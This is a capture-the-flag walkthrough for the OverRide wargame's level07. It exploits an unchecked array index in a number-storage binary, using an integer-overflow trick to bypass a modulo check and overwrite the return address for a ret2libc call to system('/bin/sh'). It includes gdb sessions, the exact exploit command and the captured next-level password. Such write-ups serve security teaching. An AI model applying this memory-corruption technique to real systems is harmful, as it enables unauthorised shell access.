So we will spare you a tons of research, ask us if you want to know how we got this:
We will use kind of a buffer overflow. The `store` method inside the binary doesn't check if the memory where we write. So we can write anything almost anywhere.
After a LOT of digging, we wanted to write a call to `system("/bin/sh")` after the `ret` inside the main function.

```assembly
(gdb) disas main
	[...]
   0x080489f1 <+718>:	ret
(gdb) b *0x080489f1
Breakpoint 1 at 0x80489f1
(gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: quit

Breakpoint 1, 0x080489f1 in main ()
(gdb) x/x $sp
0xffffd5ac:	0xf7e45513
```

```assembly
(gdb) disas system
Dump of assembler code for function system:
   0xf7e6aed0 <+0>:	sub    $0x1c,%esp
```

```assembly
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

```

So we will want to overwrite the eip `0xffffd5ac` by `0xf7e6aed0` and put, 4 byes after this address, `0xf7f897ec`.
Let's find where our input is stored when we use the `store` inside the program:

```assembly
(gdb) disas store_number 
Dump of assembler code for function store_number:
   0x08048630 <+0>:	push   %ebp
   0x08048631 <+1>:	mov    %esp,%ebp
   0x08048633 <+3>:	sub    $0x28,%esp
   0x08048636 <+6>:	movl   $0x0,-0x10(%ebp)
   0x0804863d <+13>:	movl   $0x0,-0xc(%ebp)
   0x08048644 <+20>:	mov    $0x8048ad3,%eax
   0x08048649 <+25>:	mov    %eax,(%esp)
   0x0804864c <+28>:	call   0x8048470 <printf@plt>
   0x08048651 <+33>:	call   0x80485e7 <get_unum>
   0x08048656 <+38>:	mov    %eax,-0x10(%ebp)
   0x08048659 <+41>:	mov    $0x8048add,%eax
   0x0804865e <+46>:	mov    %eax,(%esp)
   0x08048661 <+49>:	call   0x8048470 <printf@plt>
   0x08048666 <+54>:	call   0x80485e7 <get_unum>
   0x0804866b <+59>:	mov    %eax,-0xc(%ebp)
   0x0804866e <+62>:	mov    -0xc(%ebp),%ecx
   0x08048671 <+65>:	mov    $0xaaaaaaab,%edx
   0x08048676 <+70>:	mov    %ecx,%eax
   0x08048678 <+72>:	mul    %edx
   0x0804867a <+74>:	shr    %edx
   0x0804867c <+76>:	mov    %edx,%eax
   0x0804867e <+78>:	add    %eax,%eax
   0x08048680 <+80>:	add    %edx,%eax
   0x08048682 <+82>:	mov    %ecx,%edx
   0x08048684 <+84>:	sub    %eax,%edx
   0x08048686 <+86>:	test   %edx,%edx
   0x08048688 <+88>:	je     0x8048697 <store_number+103>
   0x0804868a <+90>:	mov    -0x10(%ebp),%eax
   0x0804868d <+93>:	shr    $0x18,%eax
   0x08048690 <+96>:	cmp    $0xb7,%eax
   0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
   0x08048697 <+103>:	movl   $0x8048ae6,(%esp)
   0x0804869e <+110>:	call   0x80484c0 <puts@plt>
   0x080486a3 <+115>:	movl   $0x8048af8,(%esp)
   0x080486aa <+122>:	call   0x80484c0 <puts@plt>
---Type <return> to continue, or q <return> to quit---
   0x080486af <+127>:	movl   $0x8048ae6,(%esp)
   0x080486b6 <+134>:	call   0x80484c0 <puts@plt>
   0x080486bb <+139>:	mov    $0x1,%eax
   0x080486c0 <+144>:	jmp    0x80486d5 <store_number+165>
   0x080486c2 <+146>:	mov    -0xc(%ebp),%eax
   0x080486c5 <+149>:	shl    $0x2,%eax
   0x080486c8 <+152>:	add    0x8(%ebp),%eax
   0x080486cb <+155>:	mov    -0x10(%ebp),%edx
   0x080486ce <+158>:	mov    %edx,(%eax)
   0x080486d0 <+160>:	mov    $0x0,%eax
   0x080486d5 <+165>:	leave  
   0x080486d6 <+166>:	ret    
```

The store is happening here : `0x080486ce`

```assembly
(gdb) b *0x080486ce
Breakpoint 1 at 0x80486ce
(gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 1
 Index: 1   

Breakpoint 1, 0x080486ce in store_number ()
(gdb) i r
eax            0xffffd3e8	-11288
ecx            0x1	1
edx            0x1	1
ebx            0xffffd3e4	-11292
esp            0xffffd390	0xffffd390
ebp            0xffffd3b8	0xffffd3b8
esi            0xffffd57d	-10883
edi            0x8048d60	134516064
eip            0x80486ce	0x80486ce <store_number+158>
eflags         0x286	[ PF SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

So this index `1` is stored at the address `0xffffd3e8` and we want to change the address `0xffffd5ac` (we divide by 4 because in the code they multiply by 4)

```mathematica
>>> ind_0 = 0xffffd3e4
>>> ind_s = 0xffffd5ac
>>> (ind_s - ind_0) / 4
114.0
```

So let's do this :

```bash
level07@OverRide:~$ (python -c 'print("store")'; python -c 'print(0xf7e6aed0)'; python -c 'print(114)'; python -c 'print("store")'; python -c 'print(0xf7f897ec)'; python -c 'print(116)'; python -c 'print("quit")'; cat) | ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command:  Number:  Index:  *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command:  Number:  Index:  Completed store command successfully
Input command: 
```

We have an error because 114 is a multiple of 3, let's overflow by adding `2^32 / 4`

```bash
level07@OverRide:~$ (python -c 'print("store")'; python -c 'print(0xf7e6aed0)'; python -c 'print(1073741938)'; python -c 'print("store")'; python -c 'print(0xf7f897ec)'; python -c 'print(2147483764)'; python -c 'print("quit")'; cat) | ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

```bash
su level08
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

